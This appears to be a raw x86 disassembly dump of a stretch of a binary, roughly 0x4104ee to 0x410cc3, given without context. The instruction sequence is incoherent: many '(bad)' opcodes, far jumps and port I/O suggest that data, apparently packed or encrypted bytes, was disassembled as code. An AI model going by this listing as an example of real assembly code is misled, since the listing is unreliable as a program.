  4104ee:	push   eax
  4104ef:	xor    edi,DWORD PTR [esi+0x4d5c3632]
  4104f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4104f6:	and    al,0x4a
  4104f8:	icebp  
  4104f9:	xchg   edi,eax
  4104fa:	adc    DWORD PTR [edi-0x6ed95f4e],ecx
  410500:	or     eax,esp
  410502:	sbb    eax,0xcd67dcd6
  410507:	and    edx,DWORD PTR ds:0x2c01586d
  41050d:	fwait
  41050e:	mov    bh,0x33
  410510:	push   ds
  410511:	adc    eax,0xc5936d02
  410516:	enter  0x453f,0xe6
  41051a:	inc    ecx
  41051b:	pop    esi
  41051c:	icebp  
  41051d:	rol    DWORD PTR [edx],0x6c
  410520:	or     eax,0xdfc8fa66
  410525:	xlat   BYTE PTR ds:[ebx]
  410526:	cld    
  410527:	lods   al,BYTE PTR ds:[esi]
  410528:	pusha  
  410529:	add    esi,eax
  41052b:	xchg   ebp,eax
  41052c:	jns    0x41052d
  41052e:	mov    al,ds:0x74b934b4
  410533:	adc    BYTE PTR [ebp+0x5f],bl
  410536:	test   al,0x60
  410538:	jnp    0x41058f
  41053a:	fistp  DWORD PTR [ebx+0x58]
  41053d:	jo     0x4104fd
  41053f:	xchg   esi,eax
  410540:	mov    edi,0x32f0daa8
  410545:	xor    eax,0xcc6f2c6b
  41054a:	test   al,0x8e
  41054c:	xchg   ebp,edi
  41054e:	cwde   
  41054f:	mov    fs,WORD PTR [ebx+edx*2+0x31]
  410553:	ins    DWORD PTR es:[edi],dx
  410554:	dec    edi
  410555:	cmp    dh,BYTE PTR [edx]
  410557:	adc    esp,ebx
  410559:	les    ebp,FWORD PTR [eax+esi*4]
  41055c:	es test eax,0x3c2e8b55
  410562:	(bad)  
  410563:	cli    
  410564:	dec    edi
  410565:	in     al,0xab
  410567:	jmp    0x370664b0
  41056c:	imul   ebx,DWORD PTR ds:0xc7008a2d,0x5c
  410573:	push   es
  410574:	(bad)  
  410575:	in     eax,dx
  410576:	adc    ebx,ecx
  410578:	dec    esp
  410579:	in     eax,0x61
  41057b:	cmp    edx,DWORD PTR [ebp+eiz*1-0x53]
  41057f:	int3   
  410580:	pusha  
  410581:	test   eax,0x1a5c0714
  410586:	cmc    
  410587:	or     DWORD PTR [edi+0x755739f1],edx
  41058d:	retf   
  41058e:	arpl   WORD PTR [esi-0x31],ax
  410591:	cli    
  410592:	dec    esp
  410593:	imul   ecx,DWORD PTR [ebx+0x17248a80],0x13bd9f57
  41059d:	fadd   st(3),st
  41059f:	dec    esi
  4105a0:	mov    bl,BYTE PTR [eax]
  4105a2:	test   al,0xe
  4105a4:	pop    eax
  4105a5:	xchg   ebp,eax
  4105a6:	das    
  4105a7:	adc    bh,BYTE PTR [edx+0x4d81267]
  4105ad:	shr    edx,1
  4105af:	fwait
  4105b0:	mov    esp,0xc80d8936
  4105b5:	mov    ebp,0xcc7bcc2f
  4105ba:	int    0x7
  4105bc:	ins    BYTE PTR es:[edi],dx
  4105bd:	scas   eax,DWORD PTR es:[edi]
  4105be:	es mov bh,0xb7
  4105c1:	pop    esp
  4105c2:	inc    edi
  4105c3:	push   ds
  4105c4:	ret    
  4105c5:	icebp  
  4105c6:	push   0x18
  4105c8:	xor    eax,0x89b03cb2
  4105cd:	mov    DWORD PTR [ebx],esp
  4105cf:	dec    edi
  4105d0:	jp     0x410575
  4105d2:	push   edi
  4105d3:	(bad)  
  4105d4:	addr16 mov bl,0xd7
  4105d7:	jg     0x41060a
  4105d9:	out    dx,al
  4105da:	retf   
  4105db:	dec    ebx
  4105dc:	mov    bl,0x58
  4105de:	sbb    BYTE PTR [ecx+0x55cb039a],0x34
  4105e5:	xor    edi,DWORD PTR [edi]
  4105e7:	sbb    eax,0xc377f394
  4105ec:	xor    DWORD PTR [edx+edi*2],edx
  4105ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4105f0:	mov    ecx,0x3d92991e
  4105f5:	or     al,BYTE PTR [esi+0x16]
  4105f8:	adc    dl,dl
  4105fa:	out    dx,al
  4105fb:	xchg   ebp,eax
  4105fc:	ror    DWORD PTR [ecx+0x637c306a],0xfd
  410603:	or     eax,0x4765c6b8
  410608:	adc    al,0x1
  41060a:	popa   
  41060b:	ror    DWORD PTR [edi+0x62],0x3d
  41060f:	mov    DWORD PTR ds:[ecx-0x5],esp
  410613:	inc    esi
  410614:	mov    esi,0x64121fa6
  410619:	or     BYTE PTR [edx+ebp*4],0x3e
  41061d:	adc    DWORD PTR [ebx-0x72f453d7],ebp
  410623:	jp     0x410612
  410625:	or     bh,BYTE PTR [edi+edi*4]
  410628:	or     ebx,DWORD PTR [edi+0x25]
  41062b:	or     dl,BYTE PTR [ecx]
  41062d:	cmp    ebp,DWORD PTR [esi+0x10]
  410630:	cmp    BYTE PTR [eax],bl
  410632:	or     DWORD PTR ss:[eax+0x3d],edx
  410636:	inc    ebx
  410637:	mov    ecx,0xe1db5449
  41063c:	imul   ebx,DWORD PTR [edi-0x38703b30],0xcfdc1fd
  410646:	ret    0x7d66
  410649:	jmp    0x54fc5d9c
  41064e:	xchg   esp,eax
  41064f:	mov    ebp,0xd0c77e7c
  410654:	ret    0xdb1d
  410657:	xor    eax,esi
  410659:	lods   al,BYTE PTR ds:[esi]
  41065a:	or     al,BYTE PTR [edx]
  41065c:	outs   dx,BYTE PTR ds:[esi]
  41065d:	dec    edx
  41065e:	aad    0x14
  410660:	dec    ebx
  410661:	retf   0x812b
  410664:	dec    eax
  410665:	daa    
  410666:	sbb    BYTE PTR [edx],dl
  410668:	nop
  410669:	jns    0x410618
  41066b:	adc    BYTE PTR [ebx+ebp*4+0x4e5beda1],0x62
  410673:	xchg   ecx,eax
  410674:	(bad)  
  410675:	fild   WORD PTR [ebx-0x26]
  410678:	mov    bh,0x99
  41067a:	sbb    ebp,0x84ec4453
  410680:	imul   ebp,DWORD PTR [ecx],0xffffffb7
  410683:	ins    DWORD PTR es:[edi],dx
  410684:	es cli 
  410686:	cdq    
  410687:	cmp    DWORD PTR [eax+0x593f95d9],0xbb537564
  410691:	and    bh,al
  410693:	in     al,dx
  410694:	lods   eax,DWORD PTR ds:[esi]
  410695:	or     al,0xf1
  410697:	ss jle 0x4106d4
  41069a:	mov    bl,0x47
  41069c:	jle    0x4106b4
  41069e:	mov    bl,0xa0
  4106a0:	je     0x41066b
  4106a2:	outs   dx,BYTE PTR ds:[esi]
  4106a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4106a4:	jmp    0x4a8b:0x5ab42324
  4106ab:	xchg   BYTE PTR [ecx+0x170699fe],bl
  4106b1:	mov    esi,0x22d72d5d
  4106b6:	enter  0x5f66,0xd7
  4106ba:	dec    ecx
  4106bb:	push   eax
  4106bc:	dec    eax
  4106bd:	int    0x69
  4106bf:	(bad)  
  4106c0:	pop    esi
  4106c1:	push   0x891502fc
  4106c6:	dec    ebx
  4106c7:	adc    esi,esi
  4106c9:	jg     0x410681
  4106cb:	cmp    BYTE PTR [esi-0x14],ch
  4106ce:	retf   0x6749
  4106d1:	jp     0x410690
  4106d3:	loope  0x4106c4
  4106d5:	push   edx
  4106d6:	or     BYTE PTR [edi],ah
  4106d8:	ins    BYTE PTR es:[edi],dx
  4106d9:	adc    BYTE PTR ds:0xe9e176a1,al
  4106df:	ret    
  4106e0:	loop   0x410756
  4106e2:	or     dh,BYTE PTR [ebp-0x37]
  4106e5:	fisubr WORD PTR [eax+0x7fe908bb]
  4106eb:	pop    ecx
  4106ec:	push   ds
  4106ed:	dec    ebp
  4106ee:	mov    bl,0x3
  4106f0:	sbb    DWORD PTR [ebp-0x43d448fb],eax
  4106f6:	jnp    0x4106f0
  4106f8:	std    
  4106f9:	scas   al,BYTE PTR es:[edi]
  4106fa:	daa    
  4106fb:	ja     0x410776
  4106fd:	std    
  4106fe:	jo     0x410744
  410700:	icebp  
  410701:	in     eax,0x22
  410703:	xchg   ebx,eax
  410704:	sub    BYTE PTR [edx],dh
  410706:	mov    ?,WORD PTR [edi]
  410708:	mov    ds:0xebbacaf8,al
  41070d:	xor    ah,BYTE PTR [ebp-0x6a]
  410710:	adc    BYTE PTR [ebx+0x58],al
  410713:	pop    edi
  410714:	out    dx,al
  410715:	fs pop ss
  410717:	test   DWORD PTR [edx],ebx
  410719:	mov    ch,0xae
  41071b:	pop    esi
  41071c:	or     DWORD PTR ds:0xa10eeefc,0xffffffcf
  410723:	ret    0x85c
  410726:	sub    edi,DWORD PTR [ecx]
  410728:	sub    BYTE PTR [edx-0x6700fb1e],bl
  41072e:	xchg   edx,eax
  41072f:	xchg   ecx,eax
  410730:	mov    eax,ds:0xfe91eb92
  410735:	(bad)  
  410736:	mov    eax,0x7f235b9d
  41073b:	aam    0xc0
  41073d:	std    
  41073e:	xor    esp,eax
  410740:	repnz pop edx
  410742:	and    BYTE PTR [edx-0x28e77696],al
  410748:	aam    0xb9
  41074a:	fwait
  41074b:	bound  eax,QWORD PTR [ecx-0x710c3e45]
  410751:	outs   dx,DWORD PTR ds:[esi]
  410752:	gs or  ch,ch
  410755:	xchg   esp,eax
  410756:	jmp    0x39f58dd0
  41075b:	retf   0x9f4a
  41075e:	imul   esi,DWORD PTR [eax+0x61863f8c],0xe316a269
  410768:	or     edi,esi
  41076a:	inc    ebx
  41076b:	sbb    ebp,DWORD PTR [edi-0x48a4ac42]
  410771:	loope  0x4107aa
  410773:	xchg   ebp,eax
  410774:	xor    al,0x61
  410776:	push   esp
  410777:	or     ebx,DWORD PTR [ebp+ecx*1-0xd]
  41077b:	adc    eax,0xdc9385a6
  410780:	xor    al,0x1e
  410782:	repz ret 0xcdbf
  410786:	pop    ecx
  410787:	jmp    0x29e186ab
  41078c:	fadd   DWORD PTR [ebx+0x26]
  41078f:	and    ecx,DWORD PTR [ecx+eiz*8-0x67]
  410793:	push   0xffffffd8
  410795:	or     DWORD PTR [ebx+edx*4],eax
  410798:	push   eax
  410799:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41079a:	imul   ecx,ecx,0xa837acb0
  4107a0:	stos   BYTE PTR es:[edi],al
  4107a1:	jge    0x41078d
  4107a3:	add    al,dh
  4107a5:	cs push ss
  4107a7:	div    DWORD PTR [eax+0x69]
  4107aa:	scas   al,BYTE PTR es:[edi]
  4107ab:	out    dx,al
  4107ac:	repnz and DWORD PTR [edi],edx
  4107af:	mov    esi,0x910fbdd
  4107b4:	mov    cl,0x28
  4107b6:	xchg   esi,eax
  4107b7:	push   cs
  4107b8:	mov    ch,0x21
  4107ba:	cmp    ah,al
  4107bc:	dec    edi
  4107bd:	retf   
  4107be:	mov    dh,0xe3
  4107c0:	aas    
  4107c1:	mov    ecx,0x86e705b4
  4107c6:	xchg   DWORD PTR [ebp-0x2d0e3bc1],ebx
  4107cc:	or     BYTE PTR [edx-0x317eee38],dl
  4107d2:	and    edx,DWORD PTR [edi-0x6516a732]
  4107d8:	push   esi
  4107d9:	xor    bl,ch
  4107db:	ret    0x3d68
  4107de:	rol    bl,cl
  4107e0:	lds    ebx,FWORD PTR gs:0xeda4abc1
  4107e7:	xor    eax,0x249394f1
  4107ec:	cmove  esi,DWORD PTR [esi]
  4107ef:	and    eax,0x4f7ac432
  4107f4:	push   edi
  4107f5:	dec    DWORD PTR [ebx-0x28e68b13]
  4107fb:	mov    ds:0x36c12de0,al
  410800:	xchg   esi,eax
  410801:	loope  0x410799
  410803:	pop    ds
  410804:	inc    esi
  410805:	or     bh,BYTE PTR [eax+ebx*2+0x33]
  410809:	sti    
  41080a:	cld    
  41080b:	dec    esi
  41080c:	gs or  eax,0x1ad993e
  410812:	sub    bh,BYTE PTR [edi-0x39]
  410815:	call   0xcff8:0x8cc442e6
  41081c:	outs   dx,BYTE PTR ds:[esi]
  41081d:	pushw  es
  41081f:	sub    esi,DWORD PTR [edi+0x62]
  410822:	xchg   edi,eax
  410823:	hlt    
  410824:	adc    al,0xed
  410826:	jg     0x4108a5
  410828:	inc    edx
  410829:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41082a:	mov    dl,BYTE PTR [ecx+0x57afb6e2]
  410830:	pusha  
  410831:	cmp    al,0xcf
  410833:	mov    bl,0xdf
  410835:	and    ecx,esi
  410837:	jl     0x410838
  410839:	rcl    BYTE PTR ds:0xe269c99b,0x4c
  410840:	push   ds
  410841:	in     al,dx
  410842:	arpl   WORD PTR [edx-0x4f],si
  410845:	push   esi
  410846:	sahf   
  410847:	(bad)  
  410848:	outs   dx,DWORD PTR ds:[esi]
  410849:	inc    edx
  41084a:	pop    edi
  41084b:	lods   eax,DWORD PTR ds:[esi]
  41084c:	sbb    BYTE PTR [ecx-0x118c7581],ch
  410852:	dec    ebx
  410853:	ja     0x4108ae
  410855:	cwde   
  410856:	pop    edx
  410857:	fidivr DWORD PTR [esi-0x6a65520]
  41085d:	pop    ds
  41085e:	dec    esp
  41085f:	sub    esp,esp
  410861:	cmp    BYTE PTR [ecx-0x61],ah
  410864:	jno    0x4108b0
  410866:	ds in  al,0x65
  410869:	mov    bh,0x7f
  41086b:	daa    
  41086c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41086d:	jmp    0xebce:0xdead349c
  410874:	jb     0x4108f5
  410876:	xor    al,0x8f
  410878:	shr    edi,0xd7
  41087b:	jae    0x4108df
  41087d:	or     dh,dh
  41087f:	ins    BYTE PTR es:[edi],dx
  410880:	pushf  
  410881:	cld    
  410882:	or     al,0x81
  410884:	pop    edx
  410885:	les    ecx,FWORD PTR [ebx+esi*1-0x38134dbb]
  41088c:	dec    cx
  41088e:	sbb    al,0x27
  410890:	and    DWORD PTR [edi-0x4c],ebx
  410893:	jns    0x4108d2
  410895:	(bad)  
  410896:	popa   
  410897:	aad    0x86
  410899:	mov    ebx,0x800b5df1
  41089e:	xor    cl,cl
  4108a0:	int3   
  4108a1:	add    al,0x7
  4108a3:	mov    DWORD PTR [edi-0x6baa03a8],esp
  4108a9:	xor    ah,ch
  4108ab:	mov    edi,0x52ea5381
  4108b0:	ret    0x5bf0
  4108b3:	jmp    0x766b:0x9e33f531
  4108ba:	xlat   BYTE PTR ds:[ebx]
  4108bc:	jae    0x4108e2
  4108be:	add    DWORD PTR [ebx],ecx
  4108c0:	mov    edi,0x421ac493
  4108c5:	dec    edx
  4108c6:	sbb    bl,BYTE PTR [ebx-0x55]
  4108c9:	cs hlt 
  4108cb:	pop    ebx
  4108cc:	add    eax,0x5807b70d
  4108d1:	outs   dx,DWORD PTR ds:[esi]
  4108d2:	ror    DWORD PTR [ecx],1
  4108d4:	pop    ebp
  4108d5:	imul   esp,DWORD PTR [eax],0xd0159e29
  4108db:	lahf   
  4108dc:	mov    edx,0xe9e8dc3f
  4108e1:	jmp    0x41088e
  4108e3:	cmp    DWORD PTR ds:[edx-0x27],eax
  4108e7:	cli    
  4108e8:	test   BYTE PTR [edi-0x2a06f793],ch
  4108ee:	aaa    
  4108ef:	lods   eax,DWORD PTR ds:[esi]
  4108f0:	cwde   
  4108f1:	xchg   ebp,eax
  4108f2:	cdq    
  4108f3:	cwde   
  4108f4:	pop    ebp
  4108f5:	fwait
  4108f6:	pop    ebp
  4108f7:	xchg   DWORD PTR [ebp+0x6f],edx
  4108fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4108fb:	cmp    edi,ebx
  4108fd:	xor    DWORD PTR [esp+ecx*2],esi
  410900:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410901:	repz rep outs dx,DWORD PTR ds:[esi]
  410904:	add    eax,0x687bc397
  410909:	jnp    0x4108e5
  41090b:	sub    eax,0x571269c0
  410910:	sub    al,0xe7
  410912:	xor    BYTE PTR [ecx-0x14d29eca],bl
  410918:	(bad)  
  410919:	ja     0x4108a1
  41091b:	sub    DWORD PTR [eax+0x72d0fce8],ebx
  410921:	pop    ds
  410922:	xor    al,0x6a
  410924:	push   ecx
  410925:	fbstp  TBYTE PTR [esi]
  410927:	and    edi,ecx
  410929:	inc    edi
  41092a:	into   
  41092b:	les    edx,FWORD PTR [esi+edx*4]
  41092e:	ficom  DWORD PTR [ecx+0x51]
  410931:	js     0x41098a
  410933:	mov    ch,0xb2
  410935:	mov    al,0xd4
  410937:	mov    ch,0x83
  410939:	inc    BYTE PTR [ebx-0x29cf09de]
  41093f:	in     al,0xe1
  410941:	mov    BYTE PTR [ecx-0x66],dl
  410944:	pop    ecx
  410945:	and    al,BYTE PTR [ecx]
  410947:	inc    edx
  410948:	loope  0x410948
  41094a:	mov    ?,WORD PTR [ecx]
  41094c:	cmp    BYTE PTR fs:[ebx-0x14],cl
  410950:	cmc    
  410951:	test   DWORD PTR [esi+eiz*4+0x65],edi
  410955:	or     edi,DWORD PTR ds:0xe7d63322
  41095b:	ret    
  41095c:	nop
  41095d:	ss push 0x70004259
  410963:	cmp    eax,0x61a0fe3c
  410968:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410969:	add    eax,DWORD PTR [edx+0x444969b0]
  41096f:	dec    ebp
  410970:	sbb    bl,ah
  410972:	(bad)  
  410973:	cdq    
  410974:	pop    edi
  410975:	mov    eax,ds:0xd94c3959
  41097a:	and    edi,esi
  41097c:	retf   0x717b
  41097f:	ror    BYTE PTR [edx+0x33],1
  410982:	in     eax,0xe7
  410984:	data16 sbb cl,BYTE PTR gs:[esi-0x5e19ceb7]
  41098c:	cli    
  41098d:	js     0x4109e0
  41098f:	add    esp,DWORD PTR [edi]
  410991:	jbe    0x4109aa
  410993:	add    BYTE PTR [ebx],0x4
  410996:	sub    DWORD PTR [ebp+0x15acc49d],ecx
  41099c:	out    dx,eax
  41099d:	inc    edi
  41099e:	shr    DWORD PTR [ebp+0x4d327994],1
  4109a4:	lds    ecx,FWORD PTR [esi+0x23]
  4109a7:	adc    DWORD PTR [edx-0x1d],esi
  4109aa:	mov    esp,0x5a8aea7f
  4109af:	add    eax,DWORD PTR [eax+0x1eb3ae24]
  4109b5:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  4109b7:	inc    ecx
  4109b8:	stos   DWORD PTR es:[edi],eax
  4109b9:	jp     0x41099f
  4109bb:	inc    edx
  4109bc:	xchg   BYTE PTR [edi-0x5e],bl
  4109bf:	xchg   ebx,eax
  4109c0:	mov    bl,0x1b
  4109c2:	in     al,0x9a
  4109c4:	mov    eax,0xd3b68dc7
  4109c9:	push   edi
  4109ca:	das    
  4109cb:	or     BYTE PTR [ecx+0x4e31e7c6],dh
  4109d1:	inc    ebp
  4109d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4109d3:	xchg   ebp,eax
  4109d4:	jae    0x2e91610f
  4109da:	sub    esp,DWORD PTR [edx+0x289ab3e8]
  4109e0:	cmp    eax,0x17ce391f
  4109e5:	popf   
  4109e6:	mov    ecx,0x62eaa976
  4109eb:	push   edx
  4109ec:	int3   
  4109ed:	(bad)  
  4109ee:	and    DWORD PTR [ebx],0xffffffc5
  4109f1:	shl    BYTE PTR [edx+eiz*1+0x27],1
  4109f5:	adc    edx,ebx
  4109f7:	push   0xffffff89
  4109f9:	add    eax,0xf137a734
  4109fe:	loopne 0x410a51
  410a00:	dec    esi
  410a01:	sar    DWORD PTR [esi+eiz*1-0x27],cl
  410a05:	jmp    0x4109a2
  410a07:	icebp  
  410a08:	sub    al,0x22
  410a0a:	pop    esi
  410a0b:	int3   
  410a0c:	sbb    ecx,DWORD PTR [edi+0xf]
  410a0f:	xor    cl,dh
  410a11:	xchg   esp,eax
  410a12:	xchg   edi,eax
  410a13:	and    cl,al
  410a15:	test   DWORD PTR [ebp+ecx*8+0x7e],ebp
  410a19:	pop    ebp
  410a1a:	stos   DWORD PTR es:[edi],eax
  410a1b:	sbb    BYTE PTR [edi+0x79],0x87
  410a1f:	sub    al,BYTE PTR [edx-0x1f]
  410a22:	mov    ebx,0xaa78f591
  410a27:	in     al,0x12
  410a29:	fisubr DWORD PTR [ecx+0x7d]
  410a2c:	pop    ebp
  410a2d:	shr    ah,0x46
  410a30:	xor    BYTE PTR [eax-0xd2bc683],bl
  410a36:	jmp    0x6aeaa52b
  410a3b:	push   0x54119d50
  410a40:	stc    
  410a41:	mov    eax,0xc2da1b58
  410a46:	and    DWORD PTR [ebx-0x9],0x64
  410a4a:	jae    0x410a5c
  410a4c:	int    0xd5
  410a4e:	dec    edx
  410a4f:	jo     0x410a2e
  410a51:	xchg   esi,eax
  410a52:	add    BYTE PTR [ecx+0x7],dh
  410a55:	es pop edi
  410a57:	add    al,0x7a
  410a59:	nop
  410a5a:	or     al,0x64
  410a5c:	push   esp
  410a5d:	cmp    eax,DWORD PTR [ecx-0x36b4ba3d]
  410a63:	popf   
  410a64:	test   eax,0x3dc990ac
  410a69:	mov    BYTE PTR [edi],ch
  410a6b:	ins    BYTE PTR es:[edi],dx
  410a6c:	mov    esp,cs
  410a6e:	es push ss
  410a70:	sahf   
  410a71:	pop    ds
  410a72:	data16 or cl,BYTE PTR [ecx-0x78]
  410a76:	popa   
  410a77:	in     eax,0x4
  410a79:	push   0x70a8b07a
  410a7e:	outs   dx,DWORD PTR ds:[esi]
  410a7f:	push   esi
  410a80:	sbb    ebp,esp
  410a82:	dec    ebp
  410a83:	das    
  410a84:	add    BYTE PTR [ecx+0x34],ah
  410a87:	jmp    0xfd41:0x6418adc5
  410a8e:	rcr    DWORD PTR [edx+0x6311716d],1
  410a94:	daa    
  410a95:	sub    BYTE PTR [edx-0x2e],al
  410a98:	and    DWORD PTR [ecx],ecx
  410a9a:	mov    edi,0xbb3d2555
  410a9f:	and    DWORD PTR [esi+0x53],ecx
  410aa2:	and    eax,0x2630427b
  410aa7:	jmp    0x64dc:0x5f92afeb
  410aae:	int3   
  410aaf:	lahf   
  410ab0:	aaa    
  410ab1:	mov    edx,0x3d94d52c
  410ab6:	sbb    dh,BYTE PTR [eax]
  410ab8:	call   0x91208384
  410abd:	pop    es
  410abe:	xchg   DWORD PTR [edi+0x69],esp
  410ac1:	inc    dh
  410ac3:	pop    esi
  410ac4:	adc    eax,eax
  410ac6:	inc    eax
  410ac7:	jbe    0x410b12
  410ac9:	or     ebp,DWORD PTR [ecx+esi*1]
  410acc:	std    
  410acd:	retf   0xb636
  410ad0:	imul   BYTE PTR [ebx]
  410ad2:	push   0xffffffc5
  410ad4:	outs   dx,DWORD PTR ds:[esi]
  410ad5:	mov    WORD PTR [edi],?
  410ad7:	lahf   
  410ad8:	mov    BYTE PTR ds:0xbe3b2e27,cl
  410ade:	inc    esp
  410adf:	xor    al,0x10
  410ae1:	jle    0x410b0c
  410ae3:	sti    
  410ae4:	into   
  410ae5:	mov    cs,WORD PTR [esi+0x5]
  410ae8:	xchg   DWORD PTR [edi+edi*8],eax
  410aeb:	mov    al,0x41
  410aed:	fwait
  410aee:	cmp    eax,DWORD PTR [edi+ecx*4-0x26]
  410af2:	dec    esi
  410af3:	pusha  
  410af4:	cdq    
  410af5:	fst    QWORD PTR [ebp-0x3]
  410af8:	jg     0x410b16
  410afa:	popf   
  410afb:	add    BYTE PTR [eax+0x7506b94f],ch
  410b01:	cli    
  410b02:	test   al,0xb5
  410b04:	xor    DWORD PTR [edi+0x5c],edi
  410b07:	pop    edi
  410b08:	add    esp,DWORD PTR [eax-0x21b4d795]
  410b0e:	sub    ebp,esp
  410b10:	mov    dh,0xb9
  410b12:	sar    BYTE PTR [ebx-0x3a82db2e],cl
  410b18:	push   ds
  410b19:	ror    BYTE PTR [edi],cl
  410b1b:	push   es
  410b1c:	ficomp WORD PTR [ebx+edx*4+0x4dc02386]
  410b23:	xchg   edx,esp
  410b25:	jge    0x410b16
  410b27:	xchg   ebx,eax
  410b28:	test   al,0x97
  410b2a:	add    BYTE PTR [ecx],0x2a
  410b2d:	push   esp
  410b2e:	enter  0x973d,0x83
  410b32:	jg     0x410b7f
  410b34:	adc    esp,eax
  410b36:	jp     0x410af4
  410b38:	mov    bh,0xb7
  410b3a:	jmp    0xd7a3:0x4963f750
  410b41:	inc    esp
  410b42:	cmp    al,0x47
  410b44:	mov    ah,0xe6
  410b46:	stos   BYTE PTR es:[edi],al
  410b47:	gs xor al,0x7
  410b4a:	outs   dx,BYTE PTR ds:[esi]
  410b4b:	cmp    ch,dl
  410b4d:	add    BYTE PTR [eax],ch
  410b4f:	or     DWORD PTR [edi+0x6b],ebx
  410b52:	sub    ebx,DWORD PTR [ebp+0x76]
  410b55:	jl     0x410bb2
  410b57:	or     al,0x69
  410b59:	out    0x1b,al
  410b5b:	pop    ss
  410b5c:	adc    DWORD PTR ds:0x137d19e7,ecx
  410b62:	add    al,0x1
  410b64:	sbb    ah,BYTE PTR [esi+edi*1]
  410b67:	push   ebp
  410b68:	das    
  410b69:	mov    ch,0x77
  410b6b:	(bad)  
  410b6c:	aad    0x40
  410b6e:	push   esi
  410b6f:	in     al,0xa8
  410b71:	shr    edx,cl
  410b73:	bound  esi,QWORD PTR [ebx+0x7f]
  410b76:	sbb    DWORD PTR [edx+0x31985fa2],ebx
  410b7c:	retf   0xaed6
  410b7f:	mov    DWORD PTR [esi+0xd],0xa6b77202
  410b86:	shl    ch,cl
  410b88:	dec    ecx
  410b89:	(bad)  
  410b8a:	mov    ecx,0x51789b17
  410b8f:	xor    al,0x8
  410b91:	cmp    BYTE PTR [ebx+0x46079cc],bl
  410b97:	mov    cl,0xa
  410b99:	dec    esp
  410b9a:	xchg   DWORD PTR [ecx+ebp*1-0x5dae7f28],ebp
  410ba1:	scas   eax,DWORD PTR es:[edi]
  410ba2:	mov    ds:0x9959d2ca,eax
  410ba7:	gs pop esi
  410ba9:	mov    edx,0xdbcc8791
  410bae:	mov    bl,0x3d
  410bb0:	and    edx,DWORD PTR [eax]
  410bb2:	or     DWORD PTR [edx-0x2f],ecx
  410bb5:	and    al,0x30
  410bb7:	(bad)  
  410bb8:	psubq  mm4,QWORD PTR [ebp+0x25]
  410bbc:	cld    
  410bbd:	sbb    DWORD PTR [esi-0x4d],ebp
  410bc0:	push   cs
  410bc1:	mov    BYTE PTR [esi],0x7c
  410bc4:	jp     0x410bba
  410bc6:	or     ebp,0x55
  410bc9:	stos   BYTE PTR es:[edi],al
  410bca:	dec    esi
  410bcb:	cld    
  410bcc:	fistp  WORD PTR [ecx-0xd90477e]
  410bd2:	setnp  ah
  410bd5:	mov    ah,0x12
  410bd7:	push   esi
  410bd8:	div    DWORD PTR [ebx]
  410bda:	push   ecx
  410bdb:	sar    DWORD PTR [ebp-0x37],1
  410bde:	dec    edi
  410bdf:	cmc    
  410be0:	push   es
  410be1:	stos   DWORD PTR es:[edi],eax
  410be2:	mov    ?,edi
  410be4:	cmc    
  410be5:	aas    
  410be6:	inc    ecx
  410be7:	mov    al,0x46
  410be9:	call   0xbb77:0x6ba1f06b
  410bf0:	jle    0x410bec
  410bf2:	call   0x8e289e0f
  410bf7:	xor    DWORD PTR [ebp+0x226fd499],edx
  410bfd:	cmp    al,0x4e
  410bff:	push   ecx
  410c00:	sti    
  410c01:	inc    eax
  410c02:	int3   
  410c03:	in     al,0x63
  410c05:	gs inc esi
  410c07:	mov    esp,?
  410c09:	fcom   QWORD PTR ds:0x9a9cfed6
  410c0f:	arpl   WORD PTR [esi-0x23d50d2],bx
  410c15:	out    0x76,al
  410c17:	sbb    eax,0x2d1db5e2
  410c1c:	jae    0x410c2d
  410c1e:	mov    ds:0xb8de5b4c,eax
  410c23:	ds sub al,0xe0
  410c26:	repz pushw 0xffa9
  410c2a:	or     al,BYTE PTR [edx-0x2b]
  410c2d:	ds mov ebx,0x4479a13
  410c33:	sub    BYTE PTR [edi+0x4a],dh
  410c36:	ja     0x410c94
  410c38:	ja     0x410c4b
  410c3a:	fmul   QWORD PTR [eax-0x69]
  410c3d:	repz push ds
  410c3f:	cli    
  410c40:	and    ebx,DWORD PTR [ebx+0x39e95f52]
  410c46:	inc    edx
  410c47:	hlt    
  410c48:	in     eax,dx
  410c49:	loop   0x410c48
  410c4b:	pop    ecx
  410c4c:	lea    eax,ds:[ebx+0x73684929]
  410c53:	ror    BYTE PTR [edx],0x4d
  410c56:	sbb    BYTE PTR cs:[eax-0x128136a5],bh
  410c5d:	cmp    DWORD PTR [ecx-0x10],esi
  410c60:	xor    edi,DWORD PTR cs:0x340c3671
  410c67:	shl    BYTE PTR [edx+0xb38c672],1
  410c6d:	pop    ss
  410c6e:	and    esp,DWORD PTR [ecx]
  410c70:	imul   BYTE PTR [edi-0x5b]
  410c73:	or     BYTE PTR [eax-0x67],al
  410c76:	bound  di,DWORD PTR [eax]
  410c79:	les    ebp,FWORD PTR [eax-0x38]
  410c7c:	xchg   ebx,eax
  410c7d:	sbb    eax,0xd048ace9
  410c82:	jne    0x410c2b
  410c84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c85:	cmp    ebp,ebx
  410c87:	sahf   
  410c88:	jb     0x410cef
  410c8a:	add    al,0xab
  410c8c:	cmp    al,0x8d
  410c8e:	or     DWORD PTR [ebp+0x2586184f],eax
  410c94:	les    eax,FWORD PTR [eax-0x38b11d7f]
  410c9a:	ins    DWORD PTR es:[edi],dx
  410c9b:	mov    BYTE PTR [edi+ebx*4],bh
  410c9e:	cdq    
  410c9f:	addr16 out dx,eax
  410ca1:	and    esp,ecx
  410ca3:	ja     0x410d03
  410ca5:	rol    BYTE PTR ds:0x487cffd6,1
  410cab:	shl    BYTE PTR [ecx+0x38],1
  410cae:	fs shl al,0x42
  410cb2:	mov    eax,0xdf3cc171
  410cb7:	cmp    cl,BYTE PTR [esi]
  410cb9:	pop    ecx
  410cba:	aam    0x11
  410cbc:	push   eax
  410cbd:	adc    BYTE PTR ds:0x7f3e47be,dl
  410cc3:	and    bh,BYTE PTR [eax-0x6782cec]
